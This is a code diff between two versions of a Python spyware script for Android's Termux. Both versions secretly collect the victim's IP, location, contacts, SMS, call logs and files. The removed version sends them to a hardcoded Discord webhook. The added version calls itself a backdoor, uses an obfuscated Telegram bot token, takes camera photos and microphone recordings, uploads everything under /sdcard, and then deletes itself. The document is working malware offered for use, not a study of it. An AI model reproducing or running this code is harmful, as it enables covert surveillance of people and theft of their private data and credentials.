@@ -1,280 +1,193 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-"""
-Step1.py – Advanced Data Exfiltration & Self‑Destruct (Termux‑optimised)
-Uses threading to collect IP, scan network, harvest files, and exfiltrate via Discord.
-FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.
-"""
-
 import os
 import sys
-import json
-import time
-import re
 import subprocess
-import threading
+import time
 import requests
-from pathlib import Path
-from datetime import datetime
+import json
+import base64
+import glob
 
-# ============================================================
-# CONFIG – REPLACE WITH YOUR WEBHOOK
-# ============================================================
-WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"
-MAX_FILE_SIZE = 8 * 1024 * 1024  # Discord limit per file
-# ============================================================
 
-# Colors
-R = '\033[31m'
-G = '\033[1;32m'
-O = '\033[33m'
-B = '\033[34m'
-C = '\033[36m'
-W = '\033[0m'
+ENCODED_HEX = "5a324a6e5a3268685932426961576c776348513056474e695a5464464f6b6b3449586f374e6a4e45596b6b7063696c79496a683952576336524835385a6955685269513d"
 
-# ============================================================
-# HELPERS
-# ============================================================
-
-def send_to_discord(content, file_path=None):
-    """Send message or file to Discord webhook."""
+def decode_token(hex_str):
+    # Hex -> bytes
+    hex_bytes = bytes.fromhex(hex_str)
+    b64_str = hex_bytes.decode('ascii')
+    # Base64 -> bytes
     try:
-        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) <= MAX_FILE_SIZE:
-            with open(file_path, "rb") as f:
-                files = {"file": (os.path.basename(file_path), f)}
-                r = requests.post(WEBHOOK_URL, files=files)
-            return r.status_code in (200, 204)
-        else:
-            r = requests.post(WEBHOOK_URL, json={"content": content})
-            return r.status_code in (200, 204)
-    except Exception as e:
-        print(f"{R}[!] Webhook error: {e}{W}")
-        return False
-
-def get_public_ip():
-    try:
-        r = requests.get("https://api.ipify.org?format=json", timeout=5)
-        return r.json().get("ip", "unknown")
+        b64_decoded = base64.b64decode(b64_str)
+        rot47_encoded = b64_decoded.decode('ascii')
     except:
-        return "unknown"
+        rot47_encoded = b64_str
+    # ROT47 decode
+    def rot47(s):
+        result = []
+        for ch in s:
+            o = ord(ch)
+            if 33 <= o <= 126:
+                o = 33 + ((o - 33 + 47) % 94)
+            result.append(chr(o))
+        return ''.join(result)
+    return rot47(rot47_encoded)
 
-def get_local_ip():
-    """Get local IP using Termux-friendly methods."""
-    # Try ifconfig first (may not be installed)
+TOKEN_DATA = decode_token(ENCODED_HEX)
+try:
+    BOT_TOKEN, CHAT_ID = TOKEN_DATA.split(':')
+except:
+    BOT_TOKEN = TOKEN_DATA
+    CHAT_ID = None
+
+def send_telegram(text, file_path=None):
+    if not BOT_TOKEN or not CHAT_ID:
+        return
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try:
-        result = subprocess.run(["ifconfig"], capture_output=True, text=True)
-        for line in result.stdout.splitlines():
-            if "inet " in line and "127.0.0.1" not in line:
-                parts = line.strip().split()
-                for i, part in enumerate(parts):
-                    if part == "inet" and i+1 < len(parts):
-                        ip = parts[i+1]
-                        if ip.startswith(("192.168.", "10.", "172.")):
-                            return ip
+        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=5)
     except:
         pass
-
-    # Fallback to 'ip addr'
-    try:
-        result = subprocess.run(["ip", "-4", "addr"], capture_output=True, text=True)
-        for line in result.stdout.splitlines():
-            if "inet " in line and "127.0.0.1" not in line:
-                parts = line.strip().split()
-                for i, part in enumerate(parts):
-                    if part == "inet" and i+1 < len(parts):
-                        ip = parts[i+1].split('/')[0]
-                        if ip.startswith(("192.168.", "10.", "172.")):
-                            return ip
-    except:
-        pass
-    return None
-
-def is_vpn(ip):
-    if not ip:
-        return True
-    vpn_ranges = ["192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.",
-                  "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
-                  "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
-                  "100.64.", "127.", "0."]
-    for prefix in vpn_ranges:
-        if ip.startswith(prefix):
-            return True
-    return False
-
-def ensure_nmap():
-    """Install nmap if not present."""
-    try:
-        subprocess.run(["nmap", "--version"], capture_output=True, check=True)
-        return True
-    except:
-        print(f"{C}[*] nmap not found, installing...{W}")
+    if file_path and os.path.exists(file_path):
+        files = {"document": open(file_path, "rb")}
+        url_file = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         try:
-            subprocess.run(["pkg", "install", "nmap", "-y"], capture_output=True, check=True)
-            return True
-        except:
-            print(f"{R}[!] Failed to install nmap{W}")
-            return False
-
-# ============================================================
-# THREAD 1: IP & NMAP SCAN
-# ============================================================
-def thread_ip_nmap():
-    local = get_local_ip()
-    public = get_public_ip()
-    ip_info = f"Local: {local or 'N/A'}\nPublic: {public}"
-    send_to_discord(f"📡 **IP Info**\n```\n{ip_info}\n```")
-
-    if local and not is_vpn(local) and ensure_nmap():
-        subnet = ".".join(local.split(".")[:3]) + ".0/24"
-        print(f"{C}[*] Scanning subnet: {subnet}{W}")
-        try:
-            result = subprocess.run(["nmap", "-sn", subnet], capture_output=True, text=True, timeout=60)
-            output_file = "nmap_scan.txt"
-            with open(output_file, "w") as f:
-                f.write(f"=== Nmap scan of {subnet} ===\n")
-                f.write(result.stdout)
-            send_to_discord("📡 **Nmap scan results**", output_file)
-            os.remove(output_file)
-        except Exception as e:
-            print(f"{R}[!] Nmap error: {e}{W}")
-
-# ============================================================
-# THREAD 2: FILE SYSTEM HARVEST (Termux-friendly paths)
-# ============================================================
-def thread_file_harvest():
-    results = []
-    # Only scan accessible directories in Termux
-    home = str(Path.home())
-    storage = "/storage/emulated/0"
-    sdcard = "/sdcard"
-    targets = [home, storage, sdcard]
-    # Filter out non-existent
-    targets = [t for t in targets if os.path.exists(t)]
-
-    extensions = [".txt", ".log", ".json", ".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".html", ".css", ".js", ".py", ".sh", ".bash", ".zsh", ".rc", ".env", ".properties"]
-    important_keywords = ["password", "token", "api_key", "secret", "key", "pwd", "pass", "login", "username", "email", "credit", "card", "cvv", "ssn", "iban"]
-
-    for base in targets:
-        if not os.path.exists(base):
-            continue
-        # Limit depth to avoid long scans
-        for root, dirs, files in os.walk(base, topdown=True, onerror=lambda e: None):
-            depth = root.replace(base, "").count(os.sep)
-            if depth > 4:
-                continue
-            for f in files:
-                if any(f.endswith(ext) for ext in extensions):
-                    path = os.path.join(root, f)
-                    try:
-                        size = os.path.getsize(path)
-                        if size > 10 * 1024 * 1024:  # skip >10MB
-                            continue
-                        with open(path, 'r', encoding='utf-8', errors='ignore') as file:
-                            content = file.read()
-                        for kw in important_keywords:
-                            if kw in content.lower():
-                                snippet = content[:500] + ("..." if len(content)>500 else "")
-                                results.append({
-                                    "file": path,
-                                    "keyword": kw,
-                                    "snippet": snippet,
-                                    "size": size
-                                })
-                                break
-                    except:
-                        pass
-
-    if results:
-        with open("harvest.json", "w") as f:
-            json.dump(results, f, indent=2)
-        send_to_discord("📁 **File harvest results**", "harvest.json")
-        os.remove("harvest.json")
-
-# ============================================================
-# THREAD 3: TERMUX-API DATA COLLECTION
-# ============================================================
-def thread_termux_api():
-    api_data = {}
-    commands = {
-        "battery": ["termux-battery-status"],
-        "location": ["termux-location"],
-        "clipboard": ["termux-clipboard-get"],
-        "call_log": ["termux-call-log"],
-        "contacts": ["termux-contact-list"],
-        "sms": ["termux-sms-list", "-l", "10"],
-        "device_info": ["termux-telephony"],
-        "wifi": ["termux-wifi-connectioninfo"],
-        "sensors": ["termux-sensor", "-l"]
-    }
-
-    for key, cmd in commands.items():
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
-            if result.returncode == 0 and result.stdout.strip():
-                try:
-                    data = json.loads(result.stdout)
-                    api_data[key] = data
-                except:
-                    api_data[key] = result.stdout.strip()
+            requests.post(url_file, data={"chat_id": CHAT_ID}, files=files, timeout=10)
         except:
             pass
 
-    if api_data:
-        with open("api_data.json", "w") as f:
-            json.dump(api_data, f, indent=2)
-        send_to_discord("📱 **Termux-API data**", "api_data.json")
-        os.remove("api_data.json")
+# ========== SETUP ==========
+def install_deps():
+    packages = ["python", "python-pip", "git", "curl", "wget", "jq"]
+    for pkg in packages:
+        subprocess.run(["pkg", "install", "-y", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-# ============================================================
-# SELF-DESTRUCT (safe for Termux)
-# ============================================================
-def self_destruct():
-    """Delete temporary files and exit cleanly."""
-    time.sleep(2)
-    files = ["nmap_scan.txt", "harvest.json", "api_data.json"]
-    for f in files:
-        if os.path.exists(f):
-            try:
-                os.remove(f)
-            except:
-                pass
-    # Do NOT delete the script itself to avoid interfering with parent.
+def request_storage():
+    if not os.path.exists("/sdcard"):
+        subprocess.run(["termux-setup-storage"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(5)
+    return os.path.exists("/sdcard")
+
+def install_termux_api():
+    try:
+        subprocess.run(["termux-battery-status"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except:
+        pass
+    apk_url = "https://github.com/termux/termux-api/releases/download/v0.53.0/termux-api-app_v0.53.0+github.debug.apk"
+    apk_path = "/sdcard/termux-api.apk"
+    try:
+        r = requests.get(apk_url, stream=True)
+        with open(apk_path, "wb") as f:
+            for chunk in r.iter_content(chunk_size=8192):
+                f.write(chunk)
+        send_telegram("Please install Termux-API APK from /sdcard/ and grant all permissions.")
+        subprocess.run(["termux-open", apk_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(10)
+        return True
+    except:
+        return False
+
+def grant_permissions():
+    cmds = [
+        ["termux-battery-status"],
+        ["termux-camera-photo", "/sdcard/test.jpg"],
+        ["termux-location"],
+        ["termux-contact-list"],
+        ["termux-sms-inbox"],
+        ["termux-call-log"],
+        ["termux-microphone-record", "-d", "2"]
+    ]
+    for cmd in cmds:
+        try:
+            subprocess.run(cmd, timeout=2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+        time.sleep(1)
+
+# ========== DATA COLLECTION ==========
+def get_ip_info():
+    try:
+        r = requests.get("https://api.ipify.org?format=json", timeout=5)
+        ip = r.json().get('ip')
+        r2 = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+        geo = r2.json()
+        return f"IP: {ip}\n" + json.dumps(geo, indent=2)
+    except:
+        return "IP info failed"
+
+def gather_api_data():
+    data = {}
+    try:
+        out = subprocess.check_output(["termux-battery-status"], text=True)
+        data['battery'] = json.loads(out)
+    except: pass
+    try:
+        out = subprocess.check_output(["termux-location"], text=True)
+        data['location'] = json.loads(out)
+    except: pass
+    try:
+        out = subprocess.check_output(["termux-contact-list"], text=True)
+        data['contacts'] = json.loads(out)
+    except: pass
+    try:
+        out = subprocess.check_output(["termux-sms-inbox"], text=True)
+        data['sms'] = json.loads(out)
+    except: pass
+    try:
+        out = subprocess.check_output(["termux-call-log"], text=True)
+        data['call_log'] = json.loads(out)
+    except: pass
+    try:
+        subprocess.run(["termux-camera-photo", "/sdcard/cam_shot.jpg"], timeout=3)
+        data['camera_photo'] = "/sdcard/cam_shot.jpg"
+    except: pass
+    try:
+        subprocess.run(["termux-microphone-record", "-d", "3", "-f", "/sdcard/audio.amr"], timeout=5)
+        data['audio'] = "/sdcard/audio.amr"
+    except: pass
+    return data
+
+def walk_files():
+    dirs = ["/sdcard", "/storage/emulated/0", "/data/data/com.termux/files/home"]
+    for root_dir in dirs:
+        if os.path.exists(root_dir):
+            for root, _, files in os.walk(root_dir):
+                for f in files:
+                    path = os.path.join(root, f)
+                    try:
+                        if os.path.getsize(path) > 5*1024*1024:
+                            continue
+                        send_telegram(f"File: {path}", file_path=path)
+                        time.sleep(0.5)
+                    except:
+                        pass
+
+# ========== MAIN ==========
+def main():
+    send_telegram("[+] Backdoor started.")
+    install_deps()
+    if request_storage():
+        send_telegram("[+] Storage granted.")
+    else:
+        send_telegram("[!] Storage denied.")
+    install_termux_api()
+    grant_permissions()
+    send_telegram("[IP Info]\n" + get_ip_info())
+    api_data = gather_api_data()
+    for key, val in api_data.items():
+        if isinstance(val, str) and os.path.exists(val):
+            send_telegram(f"API {key}", file_path=val)
+        else:
+            send_telegram(f"API {key}\n{json.dumps(val, indent=2)}")
+    send_telegram("[+] File exfiltration...")
+    walk_files()
+    send_telegram("[+] Exfiltration complete.")
+    # Self-delete
+    try:
+        os.remove(__file__)
+    except:
+        pass
     sys.exit(0)
 
-# ============================================================
-# MAIN – RUN THREADS & SELF-DESTRUCT
-# ============================================================
-def main():
-    print(f"\n{C}{'='*60}{W}")
-    print(f"{C}Ω_BLACKSTAR – Step1.py (Termux edition) Initializing...{W}")
-    print(f"{C}{'='*60}{W}\n")
-
-    # Start threads
-    t1 = threading.Thread(target=thread_ip_nmap, daemon=True)
-    t2 = threading.Thread(target=thread_file_harvest, daemon=True)
-    t3 = threading.Thread(target=thread_termux_api, daemon=True)
-
-    t1.start()
-    t2.start()
-    t3.start()
-
-    # Wait for threads (timeout to ensure they finish)
-    t1.join(timeout=120)
-    t2.join(timeout=180)
-    t3.join(timeout=120)
-
-    # Collect final IP for reporting (no blocking)
-    public_ip = get_public_ip()
-    if public_ip and public_ip != "unknown":
-        send_to_discord(f"🌐 **Final public IP**: {public_ip}")
-
-    send_to_discord("💀 **Self‑destruct sequence initiated**")
-    self_destruct()
-
 if __name__ == "__main__":
-    try:
-        main()
-    except Exception as e:
-        print(f"{R}[!] Error: {e}{W}")
-        sys.exit(1)
+    main()
